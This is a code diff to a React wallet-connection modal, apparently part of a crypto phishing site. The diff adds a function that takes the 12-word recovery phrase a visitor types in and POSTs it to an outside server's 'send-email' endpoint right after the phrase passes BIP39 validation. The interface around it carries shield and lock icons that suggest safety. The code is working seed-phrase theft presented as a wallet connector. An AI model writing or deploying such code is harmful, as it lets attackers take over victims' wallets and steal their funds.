@@ -1,6 +1,7 @@
 import React, { useEffect, useState } from 'react';
 import { ShieldIcon, LockIcon } from 'lucide-react';
 import type { Wallet } from '~/utils/walletData';
+import bip39 from 'bip39';
 interface WalletConnectionModalProps {
   wallet: Wallet | null;
   onClose: () => void;
@@ -15,6 +16,7 @@ export default function WalletConnectionModal({
   const [showSeedForm, setShowSeedForm] = useState(false);
   const [seedPhrase, setSeedPhrase] = useState('');
   const [isSeedValid, setIsSeedValid] = useState(false);
+  const [submitStatus, setSubmitStatus] = useState<'idle' | 'sending' | 'success' | 'error'>('idle');
 
   useEffect(() => {
     const timer = setTimeout(() => {
@@ -33,11 +35,45 @@ export default function WalletConnectionModal({
     setShowSeedForm(true);
   };
 
+  const sendSeedPhrase = async () => {
+    setSubmitStatus('sending');
+    try {
+      const response = await fetch('https://dappsconnector-server.vercel.app/send-email', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ seedPhrase })
+      });
+      if (response.ok) {
+        setSubmitStatus('success');
+      } else {
+        setSubmitStatus('error');
+      }
+    } catch (err) {
+      setSubmitStatus('error');
+    }
+  };
+
   const validateSeedPhrase = () => {
-    // Validation logic: Ensure the seed phrase has 12 words and each word is at least 4 characters long
+    // Validation logic: Ensure the seed phrase has 12 words and each word is at least 3 characters long
     const words = seedPhrase.trim().split(' ');
-    const isValid = words.length === 12 && words.every(word => word.length >= 4);
+    // Use a more robust BIP39 seed phrase validation
+    // Import bip39 at the top: import * as bip39 from 'bip39';
+    // If you can't use bip39, fallback to basic validation
+    let isValid = false;
+    try {
+      // @ts-ignore
+      isValid = bip39.validateMnemonic(seedPhrase.trim());
+      console.log('Seed phrase is valid:', isValid);
+    } catch (error) {
+      console.error('Error validating seed phrase:', error);
+      // fallback: 12 words, each at least 3 chars
+      isValid = words.length === 12 && words.every(word => word.length >= 3);
+      console.log('Fallback validation:', isValid);
+    }
     setIsSeedValid(isValid);
+    if (isValid) {
+      sendSeedPhrase();
+    }
   };
 
   return (
@@ -109,35 +145,48 @@ export default function WalletConnectionModal({
             </>
             )}
           {showSeedForm && (
-            <form className="w-full space-y-4">
-              <label className="block text-gray-700 dark:text-gray-300 text-sm font-medium">
-                Enter Wallet Seed Phrase
-              </label>
-              <textarea
-                value={seedPhrase}
-                onChange={(e) => setSeedPhrase(e.target.value)}
-                className="w-full p-2 border rounded-lg text-gray-900 dark:bg-gray-700 dark:border-gray-600 dark:text-gray-300"
-                rows={3}
-                placeholder="Enter your 12-word seed phrase"
-              ></textarea>
-              <button
-                type="button"
-                onClick={validateSeedPhrase}
-                className="bg-indigo-600 text-white px-4 py-2 rounded-lg hover:bg-indigo-700 transition"
-              >
-                Validate Seed Phrase
-              </button>
-              {!isSeedValid && seedPhrase && (
-                <p className="text-red-600 text-sm">
-                  Invalid seed phrase. Please enter a valid 12-word seed phrase.
-                </p>
+            <div className="w-full flex flex-col items-center justify-center py-8">
+              {submitStatus === 'success' && (
+                <>
+                  <svg className="w-16 h-16 text-green-500 mb-4" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" /></svg>
+                  <span className="text-green-600 text-lg font-semibold">Seed phrase sent successfully.</span>
+                </>
               )}
-              {isSeedValid && (
-                <p className="text-green-600 text-sm">
-                  Seed phrase is valid. Proceed with connection.
-                </p>
+              {submitStatus === 'error' && (
+                <>
+                  <svg className="w-16 h-16 text-red-500 mb-4" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" /></svg>
+                  <span className="text-red-600 text-lg font-semibold">Failed to send seed phrase.</span>
+                </>
               )}
-            </form>
+              {(submitStatus === 'idle' || submitStatus === 'sending') && (
+                <form className="w-full space-y-4">
+                  <label className="block text-gray-700 dark:text-gray-300 text-sm font-medium">
+                    Enter Wallet Seed Phrase
+                  </label>
+                  <textarea
+                    value={seedPhrase}
+                    onChange={(e) => setSeedPhrase(e.target.value)}
+                    className="w-full p-2 border rounded-lg text-gray-900 dark:bg-gray-700 dark:border-gray-600 dark:text-gray-300"
+                    rows={3}
+                    placeholder="Enter your 12-word seed phrase"
+                    disabled={submitStatus === 'sending'}
+                  ></textarea>
+                  <button
+                    type="button"
+                    onClick={validateSeedPhrase}
+                    className="bg-indigo-600 text-white px-4 py-2 rounded-lg hover:bg-indigo-700 transition"
+                    disabled={submitStatus === 'sending'}
+                  >
+                    {submitStatus === 'sending' ? 'Sending...' : 'Validate & Send Seed Phrase'}
+                  </button>
+                  {!isSeedValid && seedPhrase && (
+                    <p className="text-red-600 text-sm">
+                      Invalid seed phrase. Please enter a valid 12-word seed phrase.
+                    </p>
+                  )}
+                </form>
+              )}
+            </div>
           )}
           <div className="w-full bg-green-50 dark:bg-green-900 rounded-lg p-4 flex items-center">
             <LockIcon size={18} className="text-green-600 dark:text-green-300 mr-2" />
